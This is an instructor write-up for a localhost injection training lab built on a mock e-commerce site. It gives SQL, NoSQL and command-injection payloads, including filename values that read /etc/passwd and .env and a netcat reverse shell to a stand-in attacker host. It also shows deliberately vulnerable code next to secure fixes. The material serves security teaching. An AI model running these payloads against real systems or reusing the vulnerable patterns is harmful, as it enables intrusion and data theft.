# A05: Injection - Instructor Writeup

**Lab URL:** http://localhost:3005  
**Topic:** OWASP Top 10 2025 - A05: Injection  
**Difficulty:** Easy → Medium → Hard  
**Theme:** ShopTech E-Commerce Platform

---

## Overview

This lab demonstrates three major injection vulnerability types through a realistic e-commerce platform. Students progressively learn SQL injection, NoSQL injection, and Command injection techniques.

### Real-World Impact
- **Data Breach:** Customer PII, credit cards, order history exposed
- **Authentication Bypass:** Admin access without credentials
- **Server Compromise:** Command injection leads to full system control
- **Business Disruption:** Data deletion, ransomware, service outages

### Learning Objectives
- Detect and exploit SQL injection in search functionality
- Understand NoSQL operator injection in filters
- Exploit command injection in file processing systems
- Learn proper input validation and parameterized queries

---

## EXAMPLE: Product Catalog Discovery

**URL:** http://localhost:3005/example  
**Purpose:** Educational walkthrough teaching API discovery via DevTools

### Discovery Method
The Example page auto-loads **4 product API endpoints** discoverable via:
1. Open **Browser DevTools** (F12 or Cmd+Option+I)
2. Navigate to **Network tab**
3. Refresh the page to see all API calls

### Auto-Loading Endpoints

**Part 1: Products List**
```bash
curl http://localhost:3005/api/example/products
```
Response:
```json
{
  "message": "Products endpoint - Part 1 of 4",
  "products": [
    { "id": 1, "name": "Wireless Headphones Pro", "price": 249.99 },
    { "id": 2, "name": "Smart Watch Series 5", "price": 399.99 }
  ]
}
```

**Part 2: Featured Products**
```bash
curl http://localhost:3005/api/example/featured
```
Response:
```json
{
  "message": "Featured products - Part 2 of 4",
  "flag": "NSA{D3BUG_PR0DUCTS_F0UND}",
  "featured": [...]
}
```
**Flag:** `NSA{D3BUG_PR0DUCTS_F0UND}`

**Part 3 & 4: Additional APIs**
Similar endpoints revealing system information and completing the discovery challenge.

### Teaching Points
- **DevTools Network Tab:** Essential for API discovery
- **Auto-Loading APIs:** Pages often call multiple endpoints on load
- **Debug Endpoints:** Status and health checks expose system details

---

## LAB 1: Product Search - SQL Injection (Error-Based)

**URL:** http://localhost:3005/lab1  
**Difficulty:** Easy  
**Stage:** Reconnaissance  

### Vulnerability
SQL injection in search parameter allows database structure disclosure through error messages.

### Discovery Method
1. Visit http://localhost:3005/lab1
2. Use the search box or discover `/api/search` endpoint with gobuster
3. Test with special characters to trigger SQL errors

### Required Tools
- `curl` - HTTP requests
- `gobuster` (optional) - API enumeration

### Exploitation Steps

**Method 1: Direct Search Box Testing**
1. Enter a single quote `'` in the search box
2. Observe detailed SQL error message
3. Extract flag from error response

**Method 2: Using curl**

```bash
# Normal search (works fine)
curl "http://localhost:3005/api/search?q=headphones"

# SQL injection with single quote triggers error
curl "http://localhost:3005/api/search?q=test'"
```

**Method 3: Various SQL Injection Payloads**

```bash
# Single quote error
curl "http://localhost:3005/api/search?q='"

# OR-based injection
curl "http://localhost:3005/api/search?q=' OR '1'='1"

# Comment-based injection
curl "http://localhost:3005/api/search?q=test'--"

# UNION-based injection
curl "http://localhost:3005/api/search?q=' UNION SELECT NULL--"
```

### Error Response with Flag

```json
{
  "error": "SQL Error: You have an error in your SQL syntax near 'test'' at line 1\n\nQuery: SELECT * FROM products WHERE name LIKE '%test'%' OR category LIKE '%test'%' OR sku LIKE '%test'%'\n\nDatabase: shoptech_prod\nTable: products\nColumns: id, name, price, category, stock, sku, rating\n\nConnection String: postgres://shoptech_user:Sh0pT3ch2024!@db.shoptech.io:5432/shoptech_prod\n\nStack Trace:\n  at executeQuery (/app/database/query.js:156:12)\n  at searchProducts (/app/api/search.js:42:18)\n  at processRequest (/app/server.js:672:24)",
  "flag": "NSA{SQL_3RR0R_1NJ3CT}",
  "vulnerable_query": "SELECT * FROM products WHERE name LIKE '%test'%' OR category LIKE '%test'%' OR sku LIKE '%test'%'",
  "hint": "SQL injection detected! The error message exposed sensitive database information."
}
```

### Flag
**`NSA{SQL_3RR0R_1NJ3CT}`**

### Information Disclosed
- **Database Name:** `shoptech_prod`
- **Table Structure:** `products` table with columns: id, name, price, category, stock, sku, rating
- **Credentials:** Database username and password in connection string
- **Database Server:** `db.shoptech.io:5432` (PostgreSQL)
- **File Paths:** Internal application structure

### Impact
- **Database Structure Mapping:** Attacker learns exact table and column names
- **Credential Exposure:** Database password leaked in connection string
- **Information Gathering:** Foundation for advanced SQL injection attacks
- **Data Exfiltration:** Can now craft UNION queries targeting specific columns

### Vulnerable Code Pattern
```javascript
app.get('/api/search', (req, res) => {
    const query = req.query.q || '';
    
    // VULNERABLE: String concatenation in SQL query
    const sql = `SELECT * FROM products 
                 WHERE name LIKE '%${query}%' 
                 OR category LIKE '%${query}%' 
                 OR sku LIKE '%${query}%'`;
    
    try {
        const results = db.query(sql);
        res.json({ results });
    } catch (err) {
        // VULNERABLE: Exposing full error details
        res.status(500).json({
            error: err.message,
            query: sql,
            stack: err.stack
        });
    }
});
```

### Secure Implementation
```javascript
app.get('/api/search', (req, res) => {
    const query = req.query.q || '';
    
    // SECURE: Parameterized query
    const sql = `SELECT * FROM products 
                 WHERE name LIKE $1 
                 OR category LIKE $1 
                 OR sku LIKE $1`;
    
    try {
        const results = db.query(sql, [`%${query}%`]);
        res.json({ results });
    } catch (err) {
        // SECURE: Generic error, log details internally
        logger.error('Search error:', err);
        res.status(500).json({ 
            error: 'Search failed' 
        });
    }
});
```

---

## LAB 2: Product Filters - NoSQL Injection

**URL:** http://localhost:3005/lab2  
**Difficulty:** Medium  
**Stage:** Scanning  

### Vulnerability
NoSQL operator injection in filter parameters bypasses intended query logic to return all products.

### Discovery Method
1. Visit http://localhost:3005/lab2
2. Use the filter form or discover `/api/filter` endpoint
3. Test with NoSQL operators in the request payload

### Required Tools
- `curl` - HTTP POST requests
- Browser DevTools - Inspect Network tab to see request format

### Exploitation Steps

**Method 1: Using DevTools**
1. Open DevTools Network tab
2. Apply any filter in the UI
3. Observe the POST request to `/api/filter` with JSON payload
4. Modify the request in DevTools or use curl

**Method 2: Direct NoSQL Operator Injection**

```bash
# Normal filter request
curl -X POST http://localhost:3005/api/filter \
  -H "Content-Type: application/json" \
  -d '{
    "price_min": "100",
    "price_max": "300",
    "category": "audio"
  }'
```

**NoSQL Injection Payloads:**

```bash
# $gt operator - Greater Than
curl -X POST http://localhost:3005/api/filter \
  -H "Content-Type: application/json" \
  -d '{
    "price": {"$gt": 0}
  }'

# $ne operator - Not Equal (bypass filters)
curl -X POST http://localhost:3005/api/filter \
  -H "Content-Type: application/json" \
  -d '{
    "price": {"$ne": null}
  }'

# $where operator - JavaScript execution
curl -X POST http://localhost:3005/api/filter \
  -H "Content-Type: application/json" \
  -d '{
    "price": {"$where": "true"}
  }'

# $regex operator - Pattern matching bypass
curl -X POST http://localhost:3005/api/filter \
  -H "Content-Type: application/json" \
  -d '{
    "category": {"$regex": ".*"}
  }'
```

### Successful Injection Response

```json
{
  "success": true,
  "flag": "NSA{N0SQL_BYP4SS3D}",
  "message": "NoSQL injection detected! Query operators bypassed normal filtering logic.",
  "injected_filter": {
    "price": {"$gt": 0}
  },
  "results": [
    { "id": 1, "name": "Wireless Headphones Pro", "price": 249.99, "category": "audio" },
    { "id": 2, "name": "Smart Watch Series 5", "price": 399.99, "category": "wearables" },
    { "id": 3, "name": "USB-C Charging Cable 6ft", "price": 19.99, "category": "accessories" },
    { "id": 4, "name": "Laptop Stand Aluminum", "price": 79.99, "category": "office" },
    { "id": 5, "name": "4K Webcam Ultra HD", "price": 129.99, "category": "video" },
    { "id": 6, "name": "Mechanical Keyboard RGB", "price": 159.99, "category": "peripherals" },
    { "id": 7, "name": "Portable SSD 1TB", "price": 149.99, "category": "storage" },
    { "id": 8, "name": "Wireless Mouse Ergonomic", "price": 49.99, "category": "peripherals" }
  ],
  "explanation": "In a real MongoDB database, operators like $gt, $where, etc. can bypass intended query logic."
}
```

### Flag
**`NSA{N0SQL_BYP4SS3D}`**

### NoSQL Operators Explained
- **$gt / $lt:** Greater than / Less than comparisons
- **$ne:** Not equal - bypasses exact match requirements
- **$where:** Execute arbitrary JavaScript (in MongoDB)
- **$regex:** Pattern matching - `.*` matches everything
- **$in:** Match any value in array
- **$or / $and:** Logical operators for complex queries

### Impact
- **Filter Bypass:** Access products outside intended price/category filters
- **Data Exposure:** Retrieve all records regardless of access controls
- **Authentication Bypass:** In login scenarios, can bypass password checks
- **Denial of Service:** Complex $where queries can overload the database

### Real-World Examples
- **2016:** NoSQL injection in fitness app exposed 150M user records
- **2019:** E-commerce platform compromised via MongoDB operator injection
- **2021:** Gaming platform bypassed authentication using $ne operator

### Vulnerable Code Pattern
```javascript
app.post('/api/filter', (req, res) => {
    const filters = req.body;
    
    // VULNERABLE: Directly passing user input to database query
    // In MongoDB: db.products.find(filters)
    // User can inject operators like {price: {$gt: 0}}
    
    const results = await db.collection('products').find(filters).toArray();
    res.json({ results });
});
```

### Secure Implementation
```javascript
app.post('/api/filter', (req, res) => {
    const { price_min, price_max, category, rating } = req.body;
    
    // SECURE: Validate input types and build query explicitly
    const query = {};
    
    if (price_min && typeof price_min === 'number') {
        query.price = query.price || {};
        query.price.$gte = price_min;
    }
    
    if (price_max && typeof price_max === 'number') {
        query.price = query.price || {};
        query.price.$lte = price_max;
    }
    
    if (category && typeof category === 'string') {
        // Whitelist allowed categories
        const allowedCategories = ['audio', 'wearables', 'office'];
        if (allowedCategories.includes(category)) {
            query.category = category;
        }
    }
    
    // Never accept raw objects from user input
    const results = await db.collection('products').find(query).toArray();
    res.json({ results });
});
```

---

## LAB 3: Image Processing - Command Injection

**URL:** http://localhost:3005/lab3  
**Difficulty:** Hard  
**Stage:** Initial Access  

### Vulnerability
Command injection in image processing allows arbitrary system command execution through unsanitized filename parameter.

### Discovery Method
1. Visit http://localhost:3005/lab3
2. Discover `/api/process-image` endpoint with gobuster
3. Test with shell metacharacters in filename parameter

### Required Tools
- `curl` - HTTP POST requests
- Shell command knowledge - Understanding of command chaining

### Exploitation Steps

**Method 1: Using the Web Interface**
1. In the filename field, enter: `test.jpg; ls`
2. Click "Process Image"
3. Observe command execution results and flag

**Method 2: Basic Command Injection**

```bash
# Normal image processing request
curl -X POST http://localhost:3005/api/process-image \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "product-001.jpg",
    "operation": "resize"
  }'
```

**Command Injection Payloads:**

```bash
# Semicolon - Command chaining
curl -X POST http://localhost:3005/api/process-image \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "test.jpg; ls -la",
    "operation": "resize"
  }'

# Pipe - Redirect output
curl -X POST http://localhost:3005/api/process-image \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "test.jpg | cat /etc/passwd",
    "operation": "resize"
  }'

# Ampersand - Background execution
curl -X POST http://localhost:3005/api/process-image \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "test.jpg & whoami",
    "operation": "resize"
  }'

# Backticks - Command substitution
curl -X POST http://localhost:3005/api/process-image \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "test.jpg `id`",
    "operation": "resize"
  }'

# Dollar sign - Variable/command substitution
curl -X POST http://localhost:3005/api/process-image \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "test.jpg $(whoami)",
    "operation": "resize"
  }'
```

**Advanced Payloads:**

```bash
# List directory contents
curl -X POST http://localhost:3005/api/process-image \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "x; ls -la /var/www",
    "operation": "resize"
  }'

# Read sensitive files
curl -X POST http://localhost:3005/api/process-image \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "x; cat .env",
    "operation": "resize"
  }'

# Network reconnaissance
curl -X POST http://localhost:3005/api/process-image \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "x; netstat -an",
    "operation": "resize"
  }'

# Establish reverse shell
curl -X POST http://localhost:3005/api/process-image \
  -H "Content-Type: application/json" \
  -d '{
    "filename": "x; nc attacker.com 4444 -e /bin/bash",
    "operation": "resize"
  }'
```

### Successful Injection Response

```json
{
  "success": true,
  "flag": "NSA{C0MM4ND_1NJ3CT3D}",
  "message": "Command injection detected! System commands were executed.",
  "vulnerable_command": "convert test.jpg; ls -la -resize output.jpg",
  "output": "Simulated command execution:\n$ convert test.jpg; ls -la -resize output.jpg\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n/var/www/shoptech\ntotal 24K\ndrwxr-xr-x 5 www-data www-data 4.0K Jan 22 10:30 .\ndrwxr-xr-x 3 root     root     4.0K Jan 15 14:20 ..\n-rw-r--r-- 1 www-data www-data  156 Jan 22 09:45 .env\ndrwxr-xr-x 2 www-data www-data 4.0K Jan 22 10:15 uploads\n-rw------- 1 www-data www-data 2.1K Jan 20 16:30 database.key\n\nWARNING: Command injection allows arbitrary system command execution!",
  "explanation": "Characters like ; | & $ allow chaining or substituting system commands, leading to complete server compromise."
}
```

### Flag
**`NSA{C0MM4ND_1NJ3CT3D}`**

### Command Injection Characters
- **`;`** - Command separator (run multiple commands)
- **`|`** - Pipe (redirect output to another command)
- **`&`** - Run command in background
- **`&&`** - AND operator (run if previous succeeds)
- **`||`** - OR operator (run if previous fails)
- **`$(...)`** - Command substitution
- **`` `...` ``** - Command substitution (backticks)
- **`<` / `>`** - Input/output redirection
- **`\n`** - Newline (command separator)

### Impact
- **Complete System Compromise:** Execute any command as web server user
- **Data Exfiltration:** Read files, database credentials, source code
- **Reverse Shell:** Establish persistent remote access
- **Lateral Movement:** Use compromised server to attack internal network
- **Ransomware Deployment:** Encrypt files and demand payment
- **Cryptocurrency Mining:** Use server resources for mining

### Real-World Examples
- **2014 Shellshock:** Bash vulnerability led to millions of servers compromised
- **2017 Equifax:** Command injection in Apache Struts affected 147M people
- **2021 Exchange Server:** ProxyShell vulnerabilities exploited command injection

### Vulnerable Code Pattern
```javascript
const { exec } = require('child_process');

app.post('/api/process-image', (req, res) => {
    const { filename, operation } = req.body;
    
    // VULNERABLE: Directly concatenating user input into shell command
    const command = `convert ${filename} -${operation} output.jpg`;
    
    exec(command, (error, stdout, stderr) => {
        if (error) {
            return res.status(500).json({ error: error.message });
        }
        res.json({ 
            success: true, 
            output: stdout 
        });
    });
});
```

### Secure Implementation

**Method 1: Use Arrays Instead of Shell**
```javascript
const { execFile } = require('child_process');
const path = require('path');

app.post('/api/process-image', (req, res) => {
    const { filename, operation } = req.body;
    
    // Validate filename - only allow alphanumeric and safe characters
    if (!/^[a-zA-Z0-9_-]+\.(jpg|png|gif)$/.test(filename)) {
        return res.status(400).json({ error: 'Invalid filename' });
    }
    
    // Whitelist operations
    const allowedOps = ['resize', 'compress', 'convert', 'optimize'];
    if (!allowedOps.includes(operation)) {
        return res.status(400).json({ error: 'Invalid operation' });
    }
    
    // Use execFile with array arguments (no shell interpretation)
    execFile('convert', [filename, `-${operation}`, 'output.jpg'], (error, stdout) => {
        if (error) {
            logger.error('Image processing error:', error);
            return res.status(500).json({ error: 'Processing failed' });
        }
        res.json({ success: true });
    });
});
```

**Method 2: Use Specialized Libraries**
```javascript
const sharp = require('sharp'); // Image processing library

app.post('/api/process-image', async (req, res) => {
    const { filename, operation } = req.body;
    
    try {
        // Validate input
        const safePath = path.join(UPLOAD_DIR, path.basename(filename));
        
        // Use library instead of shell commands
        switch(operation) {
            case 'resize':
                await sharp(safePath).resize(800, 600).toFile('output.jpg');
                break;
            case 'compress':
                await sharp(safePath).jpeg({ quality: 85 }).toFile('output.jpg');
                break;
            default:
                return res.status(400).json({ error: 'Invalid operation' });
        }
        
        res.json({ success: true });
    } catch (error) {
        logger.error('Image processing error:', error);
        res.status(500).json({ error: 'Processing failed' });
    }
});
```

**Method 3: Sandbox/Container Isolation**
```javascript
// Run processing in isolated container
const Docker = require('dockerode');
const docker = new Docker();

app.post('/api/process-image', async (req, res) => {
    const { filename, operation } = req.body;
    
    // Create isolated container for processing
    const container = await docker.createContainer({
        Image: 'image-processor:latest',
        Cmd: ['process', filename, operation],
        NetworkDisabled: true,  // No network access
        HostConfig: {
            Memory: 512 * 1024 * 1024,  // 512MB limit
            ReadonlyRootfs: true  // Filesystem read-only
        }
    });
    
    await container.start();
    const output = await container.logs();
    await container.remove();
    
    res.json({ success: true, output });
});
```

---

## Summary

### Flags
1. **Example:** `NSA{D3BUG_PR0DUCTS_F0UND}` - Product APIs discovered via DevTools
2. **Lab 1:** `NSA{SQL_3RR0R_1NJ3CT}` - SQL injection via search with error-based disclosure
3. **Lab 2:** `NSA{N0SQL_BYP4SS3D}` - NoSQL operator injection in filters
4. **Lab 3:** `NSA{C0MM4ND_1NJ3CT3D}` - Command injection via image processing

### Key Takeaways
1. **Parameterized Queries:** Always use prepared statements for SQL
2. **Input Validation:** Whitelist allowed values, reject special characters
3. **Avoid Shell Execution:** Use libraries instead of system commands
4. **Generic Errors:** Never expose query structure or database details
5. **Type Checking:** Validate input types to prevent operator injection
6. **Least Privilege:** Run services with minimal required permissions
7. **Sandboxing:** Isolate dangerous operations in containers
8. **Security Libraries:** Use vetted libraries like sharp, paramiko, etc.

### OWASP Top 10 2025 - A05 Mitigation
- **Parameterized Queries:** Use ORMs or prepared statements
- **Input Validation:** Strict whitelist validation on all user input
- **Escaping:** Properly escape special characters for context
- **Least Privilege:** Database users should have minimal permissions
- **WAF Rules:** Deploy Web Application Firewall with injection detection
- **Code Review:** Manual and automated SAST scanning for injection flaws
- **Security Testing:** Regular penetration testing and fuzzing
